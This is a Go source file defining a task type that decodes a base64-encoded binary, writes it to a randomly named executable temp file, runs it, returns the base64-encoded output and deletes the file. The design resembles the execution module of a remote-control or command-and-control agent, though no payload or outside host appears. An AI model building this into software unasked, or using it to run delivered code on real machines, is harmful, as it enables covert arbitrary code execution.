package types

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"time"
)

const fileNameCharSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

type ExecuteDetails struct {
	Type  string
	Bin64 string
}

type ExecuteTaskFile struct {
	path string
}

func CleanUpFile(etf ExecuteTaskFile) error {
	return os.Remove(etf.path)
}

func (e ExecuteDetails) createRandomFileName(length int) string {
	rand.Seed(int64(time.Now().Second()))
	filename := make([]byte, length)
	for i := 0; i < length; i++ {
		filename[i] = fileNameCharSet[rand.Intn(len(fileNameCharSet))]
	}
	return string(filename)
}

func (e ExecuteDetails) createTempFile() (ExecuteTaskFile, error) {
	etf := ExecuteTaskFile{}
	tempFilePath := os.TempDir() + "/" + e.createRandomFileName(10)
	fileHandle, err := os.OpenFile(tempFilePath, os.O_WRONLY|os.O_CREATE, 0755)
	defer fileHandle.Close()
	if err != nil {
		return etf, err
	}
	etf.path = tempFilePath

	binBytes, err := base64.StdEncoding.DecodeString(e.Bin64)
	if err != nil {
		return etf, err
	}

	_, err = fileHandle.Write(binBytes)
	if err != nil {
		return etf, err
	}

	return etf, nil
}

func (e ExecuteDetails) Execute() (*Result, error) {
	result := new(Result)
	etf, err := e.createTempFile()
	if err != nil {
		result.Result = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		return result, err
	}
	defer CleanUpFile(etf)

	cmd := exec.Command(etf.path)
	cmdBytes, err := cmd.CombinedOutput()
	if err != nil {
		result.Result = base64.StdEncoding.EncodeToString([]byte("cmd CombinedOutput: " + err.Error()))
		return result, err
	}

	result.Result = base64.StdEncoding.EncodeToString(cmdBytes)
	return result, nil
}

func (et *ExecuteDetails) String() string {
	template :=
		`Type: %s
Bin64: %s
`
	return fmt.Sprintf(template, et.Type, et.Bin64)
}
